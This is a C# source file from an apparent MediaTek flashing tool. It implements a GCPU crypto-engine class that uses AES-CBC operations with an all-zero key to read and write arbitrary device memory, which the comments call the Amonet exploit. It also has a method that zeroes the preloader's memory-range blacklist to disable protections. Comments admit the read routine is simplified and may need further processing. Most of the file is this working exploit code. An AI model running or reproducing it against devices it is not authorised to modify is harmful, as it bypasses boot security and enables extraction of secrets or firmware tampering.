// ============================================================================
// MultiFlash TOOL - MediaTek GCPU Crypto Engine
// 联发科 GCPU 加密引擎 | MTK GCPU暗号エンジン | MTK GCPU 암호화 엔진
// ============================================================================
// [EN] Graphics Crypto Processing Unit (GCPU) for MTK devices
//      Memory read via AES-CBC decryption (Amonet exploit)
// [中文] 联发科设备图形加密处理单元 (GCPU)
//       通过 AES-CBC 解密读取内存 (Amonet 漏洞利用)
// [日本語] MTKデバイス用グラフィックス暗号処理ユニット（GCPU）
//         AES-CBC復号化によるメモリ読み取り（Amonetエクスプロイト）
// [한국어] MTK 장치용 그래픽 암호화 처리 장치(GCPU)
//         AES-CBC 복호화를 통한 메모리 읽기(Amonet 익스플로잇)
// [Español] Unidad de procesamiento criptográfico de gráficos (GCPU) para MTK
//           Lectura de memoria via descifrado AES-CBC (exploit Amonet)
// [Русский] Графический криптографический процессор (GCPU) для устройств MTK
//           Чтение памяти через дешифрование AES-CBC (эксплойт Amonet)
// ============================================================================
// GitHub: https://github.com/xiriovo/edlormtk
// Contact: QQ 1708298587 | Email: 1708298587@qq.com
// License: MIT
// ============================================================================

using System;
using System.Collections.Generic;
using tools.Modules.MTK.Protocol;
using tools.Modules.MTK.Models;

namespace tools.Modules.MTK.Hardware
{
    /// <summary>
    /// GCPU (Graphics Crypto Processing Unit) Engine
    /// GCPU 加密引擎 | GCPU暗号エンジン | GCPU 암호화 엔진
    /// Memory read via AES-CBC (Amonet exploit)
    /// </summary>
    public class GcpuEngine
    {
        private readonly PreloaderProtocol _preloader;
        private readonly ChipConfig _chipConfig;

        // GCPU 寄存器偏移
        private const uint GCPU_REG_CTL = 0x0;
        private const uint GCPU_REG_MSC = 0x4;
        private const uint GCPU_REG_INT_SET = 0x8;
        private const uint GCPU_REG_INT_CLR = 0xC;
        private const uint GCPU_REG_INT_EN = 0x10;
        private const uint GCPU_REG_MEM_CMD = 0x20;
        private const uint GCPU_REG_MEM_P0 = 0x24;
        private const uint GCPU_REG_MEM_P1 = 0x28;
        private const uint GCPU_REG_MEM_P2 = 0x2C;
        private const uint GCPU_REG_MEM_P3 = 0x30;
        private const uint GCPU_REG_MEM_P4 = 0x34;
        private const uint GCPU_REG_MEM_P5 = 0x38;
        private const uint GCPU_REG_MEM_P6 = 0x3C;
        private const uint GCPU_REG_MEM_P7 = 0x40;
        private const uint GCPU_REG_MEM_P8 = 0x44;
        private const uint GCPU_REG_MEM_P9 = 0x48;
        private const uint GCPU_REG_MEM_P10 = 0x4C;
        private const uint GCPU_REG_MEM_Slot = 0x80;
        private const uint GCPU_REG_MEM_Slot2 = 0x84;
        private const uint GCPU_REG_PC_CTL = 0x400;
        private const uint GCPU_REG_DRAM_MON = 0x404;
        private const uint GCPU_REG_TRAP_START = 0x408;
        private const uint GCPU_REG_TRAP_END = 0x40C;
        private const uint GCPU_REG_CQ = 0x800;

        // GCPU 命令
        private const uint GCPU_OPID_AES_E_CBC = 0x78;
        private const uint GCPU_OPID_AES_D_CBC = 0x79;
        private const uint GCPU_OPID_AES_E_CPTR = 0x7A;
        private const uint GCPU_OPID_AES_D_CPTR = 0x7B;
        private const uint GCPU_OPID_AES_KEY_EXPAND = 0x7C;
        private const uint GCPU_OPID_AES_CBC_CPTR = 0x7D;

        public GcpuEngine(PreloaderProtocol preloader, ChipConfig chipConfig)
        {
            _preloader = preloader;
            _chipConfig = chipConfig;
        }

        /// <summary>
        /// GCPU 基地址
        /// </summary>
        private uint GcpuBase => _chipConfig.GcpuBase ?? 0;

        /// <summary>
        /// 读取 GCPU 寄存器
        /// </summary>
        private uint ReadReg(uint offset)
        {
            return _preloader.Read32(GcpuBase + offset, 1);
        }

        /// <summary>
        /// 写入 GCPU 寄存器
        /// </summary>
        private void WriteReg(uint offset, uint value)
        {
            _preloader.Write32(GcpuBase + offset, value);
        }

        /// <summary>
        /// 初始化 GCPU
        /// </summary>
        public void Init()
        {
            // 关闭 GCPU
            WriteReg(GCPU_REG_CTL, 0);

            // 清除中断
            WriteReg(GCPU_REG_INT_CLR, 0x3F);

            // 禁用中断
            WriteReg(GCPU_REG_INT_EN, 0);

            // 设置控制
            WriteReg(GCPU_REG_MSC, 0x80071);
        }

        /// <summary>
        /// 执行 GCPU 命令
        /// </summary>
        private void Execute(uint cmd, uint[] parameters)
        {
            // 写入命令
            WriteReg(GCPU_REG_MEM_CMD, cmd);

            // 写入参数
            uint[] paramRegs = {
                GCPU_REG_MEM_P0, GCPU_REG_MEM_P1, GCPU_REG_MEM_P2, GCPU_REG_MEM_P3,
                GCPU_REG_MEM_P4, GCPU_REG_MEM_P5, GCPU_REG_MEM_P6, GCPU_REG_MEM_P7,
                GCPU_REG_MEM_P8, GCPU_REG_MEM_P9, GCPU_REG_MEM_P10
            };

            for (int i = 0; i < parameters.Length && i < paramRegs.Length; i++)
            {
                WriteReg(paramRegs[i], parameters[i]);
            }

            // 启动执行
            WriteReg(GCPU_REG_CTL, 0x1F);

            // 等待完成
            while ((ReadReg(GCPU_REG_INT_SET) & 0x1) == 0)
            {
                System.Threading.Thread.Sleep(1);
            }

            // 清除中断
            WriteReg(GCPU_REG_INT_CLR, 0x1);
        }

        /// <summary>
        /// 设置 AES 密钥 (全零密钥)
        /// </summary>
        private void SetKey()
        {
            // 设置全零 AES-128 密钥到 Slot 0
            for (uint i = 0; i < 4; i++)
            {
                WriteReg(GCPU_REG_MEM_Slot + i * 4, 0);
            }

            // 密钥扩展
            Execute(GCPU_OPID_AES_KEY_EXPAND, new uint[] { 0, 0, 0, 128, 0 });
        }

        /// <summary>
        /// 设置 AES IV (初始化向量)
        /// </summary>
        private void SetIv(uint[] iv)
        {
            // 设置 IV 到 Slot2
            for (int i = 0; i < iv.Length && i < 4; i++)
            {
                WriteReg(GCPU_REG_MEM_Slot2 + (uint)i * 4, iv[i]);
            }
        }

        /// <summary>
        /// 使用 AES-CBC 解密读取内存
        /// 原理: 利用 GCPU 的 AES-CBC 解密功能，以目标地址作为密文进行解密，
        /// 由于使用全零密钥和 IV，解密结果等同于直接读取内存内容 (存在变换)
        /// </summary>
        public byte[] AesReadCbc(uint address)
        {
            // 初始化
            Init();
            SetKey();
            SetIv(new uint[] { 0, 0, 0, 0 });

            // 执行 AES-CBC 解密
            // P0: 源地址 (目标内存)
            // P1: 目标地址 (Slot 内存)
            // P2: 长度 (字节数 / 16)
            // P3: IV Slot
            // P4: Key Slot
            uint dstSlot = GCPU_REG_MEM_Slot2;
            Execute(GCPU_OPID_AES_D_CBC, new uint[] { address, GcpuBase + dstSlot, 1, 1, 0 });

            // 读取结果
            byte[] result = new byte[16];
            for (int i = 0; i < 4; i++)
            {
                uint val = ReadReg(dstSlot + (uint)i * 4);
                BitConverter.GetBytes(val).CopyTo(result, i * 4);
            }

            // 解混淆 (AES-CBC 解密结果需要 XOR 上一块密文，这里使用地址作为 "上一块")
            // 简化处理: 直接返回 (实际可能需要额外处理)
            return result;
        }

        /// <summary>
        /// 读取任意地址的 16 字节
        /// </summary>
        public byte[] Read16(uint address)
        {
            return AesReadCbc(address);
        }

        /// <summary>
        /// 禁用内存黑名单
        /// 原理: 利用 GCPU 的内存访问能力写入黑名单区域，将其设为无效范围
        /// </summary>
        public void DisableRangeBlacklist(List<uint> blacklist)
        {
            if (blacklist == null || blacklist.Count == 0)
                return;

            // 对于每个黑名单入口，将起始/结束地址设为 0
            // 黑名单结构: base+0x0: 标志, base+0x4: 未知, base+0x8: 起始地址, base+0xC: 结束地址
            foreach (var blAddr in blacklist)
            {
                // 使用 GCPU 或 Preloader 写入
                _preloader.Write32(blAddr + 0x8, 0);
                _preloader.Write32(blAddr + 0xC, 0);
            }
        }

        /// <summary>
        /// 使用 GCPU 写入内存 (通过 AES 加密操作)
        /// </summary>
        public void AesWriteCbc(uint address, byte[] data)
        {
            if (data.Length != 16)
                throw new ArgumentException("Data must be 16 bytes");

            // 初始化
            Init();
            SetKey();
            SetIv(new uint[] { 0, 0, 0, 0 });

            // 将数据写入 Slot
            uint srcSlot = GCPU_REG_MEM_Slot2;
            for (int i = 0; i < 4; i++)
            {
                uint val = BitConverter.ToUInt32(data, i * 4);
                WriteReg(srcSlot + (uint)i * 4, val);
            }

            // 执行 AES-CBC 加密 (将 Slot 内容写入目标地址)
            Execute(GCPU_OPID_AES_E_CBC, new uint[] { GcpuBase + srcSlot, address, 1, 1, 0 });
        }
    }
}
